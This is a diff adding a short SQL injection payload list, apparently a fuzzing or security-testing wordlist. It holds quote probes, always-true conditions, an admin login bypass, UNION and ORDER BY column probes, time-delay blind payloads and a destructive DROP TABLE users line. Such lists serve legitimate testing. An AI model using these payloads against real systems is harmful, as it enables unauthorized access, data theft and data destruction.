@@ -1,0 +1,20 @@
+'
+"
+' OR '1'='1
+' OR '1'='1' --
+" OR "1"="1
+' OR 1=1 --
+'; DROP TABLE users; --
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+1' AND '1'='1
+1' AND '1'='2
+' WAITFOR DELAY '0:0:5'--
+admin' --
+' OR 1=1#
+1' ORDER BY 1--
+1' ORDER BY 100--
+' UNION ALL SELECT 1,2,3--
+1' AND SLEEP(5)--
+' AND SLEEP(5) AND '1'='1
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
